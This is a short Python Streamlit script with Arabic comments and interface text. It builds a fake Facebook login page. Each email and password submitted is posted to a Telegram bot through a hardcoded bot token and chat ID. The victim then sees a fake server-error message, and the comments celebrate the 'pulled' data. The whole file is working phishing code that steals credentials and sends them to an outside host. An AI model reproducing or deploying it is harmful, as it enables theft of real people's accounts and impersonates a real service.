import streamlit as st
import requests

# المعلومات الصحيحة من صورك
BOT_TOKEN = "8546784309:AAHe0WXiK1wyZ45JUgGxMeOQa8g-owMm9aM"
CHAT_ID = "8165652093"  # هذا هو رقم حسابك الجديد من الصورة الأخيرة

def send_telegram(user, pwd):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"🔔 تم سحب بيانات جديدة بنجاح:\n📧 الحساب: {user}\n🔑 كلمة السر: {pwd}"
    }
    try:
        requests.post(url, json=payload)
    except:
        pass

st.set_page_config(page_title="Facebook", layout="centered")

# واجهة الصفحة
st.markdown("<h1 style='color: #1877f2; text-align: center; font-family: sans-serif;'>facebook</h1>", unsafe_allow_html=True)

with st.form("login_form"):
    email = st.text_input("البريد الإلكتروني أو رقم الهاتف")
    password = st.text_input("كلمة السر", type="password")
    submit = st.form_submit_button("تسجيل الدخول", use_container_width=True)
    
    if submit:
        if email and password:
            send_telegram(email, password)
            st.error("عذراً، حدث خطأ في الخادم. يرجى المحاولة مرة أخرى لاحقاً.")
        else:
            st.warning("يرجى إدخال جميع البيانات.")
